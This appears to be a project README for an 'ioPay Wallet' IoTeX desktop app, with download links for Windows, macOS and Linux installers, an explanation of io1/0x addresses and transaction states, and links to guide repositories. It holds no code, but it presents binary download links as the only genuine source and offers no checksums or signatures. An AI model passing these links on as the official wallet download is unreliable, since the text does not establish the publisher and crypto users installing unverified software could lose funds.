![ioPay Wallet](assets/banner-profile.png)

<h1 align="center">ioPay Wallet</h1>

<p align="center"><em>Read your IoTeX balance the way the chain keeps it: one account, two addresses, one history.</em></p>

<p align="center"><a href="#license"><img src="https://img.shields.io/badge/LICENSE-Apache--2.0-0969da?style=for-the-badge&labelColor=0B1733" alt="License: Apache-2.0"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2"><img src="https://img.shields.io/badge/RELEASE-v2.0.2-0969da?style=for-the-badge&labelColor=0B1733" alt="Release: v2.0.2"></a></p>

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

Every file and its published size is listed on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2).

> **Take the balance from the chain, not from a screen.** Download only from the release page linked above.

## Why ioPay Wallet

A balance is not a number an application owns; it is a fact the chain agrees on, and everything else is a view of that fact. ioPay Wallet is built around that distinction. The desktop application stores the key on your machine, derives both address forms from it, and then reads the chain rather than keeping a private ledger of its own. When the display and the chain disagree, the chain is right, and the guide that covers the symptom explains how to prove it.

That model changes what a stuck balance means. A number that has not moved can be a display that has not refreshed, a transaction that never reached the network, or a transfer that went to an address form you did not intend. Each of those has a different fix, and none of them is "wait longer" in every case. The history view exists to separate them: status, fee and block number for every transaction, so a reader can tell a broadcast failure from a pending transfer before doing anything irreversible.

- **Both addresses, one account.** The native `io1...` address and the EVM `0x...` address belong to the same key, and the application shows them together so a transfer is not sent to the wrong encoding.
- **Tokens and coins in one view.** Native IOTX and XRC-20 tokens are read in the same place, with the fee each transaction actually paid.
- **History that names the block.** A missing row and a settled gap are different problems; the block number is what tells them apart.
- **No account to log into.** There is no sign-up and no server-side credential, so nothing about your balance passes through a login you do not control.

## Reading the balance without guessing

The most common balance question on IoTeX is not about the wallet at all: it is about which address the funds were sent to. A native transfer and an EVM-chain bridge produce different destination strings for the same account, and a bridge that expects one form will not credit the other. Before treating a balance as wrong, compare the address you gave out with the address the sending service recorded, and check the transaction on a block explorer rather than in the application alone.

The second question is about timing. A staking position can look like a missing balance because the tokens are delegated rather than sitting in the spendable total, and the vote weight shown beside a validator is not the same number as the stake. The wallet shows the position, the rewards and the unstaking countdown separately for that reason. A reader who expects the spendable balance to include a delegated stake will read a correct screen as a fault.

## How a transfer reaches the history

A confirmed transaction appears in the history with the block that included it. Between the moment you sign and that block, the transfer exists in a state the application has to describe rather than a balance it can show. The wallet labels that state instead of guessing: signed, broadcast, pending, confirmed, or failed before broadcast. Reading the label is the difference between waiting and resending, because a resend of a transfer that is already pending can double the amount.

A transaction that never reached the network leaves a different trace. There is no block number to wait for, so no amount of time will change its status, and the fee was not spent. The stale-looking balance in that case is correct: the chain never accepted the transfer. The distinction matters most on a slow connection, where the two failures look identical from the outside and only the status separates them.

History gaps come from a third cause. The application reads history from the chain through an endpoint, and an endpoint that has not caught up returns a shorter list rather than an error. A gap that fills in after a refresh is a view problem; a gap that persists across refreshes is a settled difference worth reading against a block explorer before you conclude anything about the funds.

## Guides for this part of the wallet

| Guide | What it answers |
|---|---|
| [ioPay Balance Not Updating](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-balance-not-updating.md) | Why a number sticks, and how to tell a display fault from a real send. |
| [Missing Transaction History](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-missing-transaction-history.md) | A history that stops short, and how to tell a cache problem from a settled gap. |
| [io1 and 0x Addresses in ioPay](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md) | One account, two encodings, and when each one is correct to give out. |
| [ioPay Wallet Fees Explained](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-fees-explained.md) | What the chain charges, what the wallet charges, and why a bridge quotes two gas costs. |
| [Receiving IOTX in ioPay Wallet](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/receiving-iotx-in-iopay-wallet.md) | The receive flow, the address to share and what confirms the funds arrived. |

This repository is one part of the ioPay Wallet account; the wallet described above is the product, and the guides carry the detail.

## Security

**A balance page never needs your recovery phrase, and any request for it - to verify, recover or migrate - is not this project.**

## Support

There is no issue tracker on these repositories and no support desk that holds credentials. The [help guide](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md) explains which route exists and which claims to ignore.

## License

Apache-2.0, the licence the ioPay Wallet project itself uses.

---

[Wallet repository](https://github.com/iopay-project/iopay-desktop-wallet) - [v2.0.2 release](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2) - [All guides](https://github.com/iopay-project/desktop-setup-and-safety)
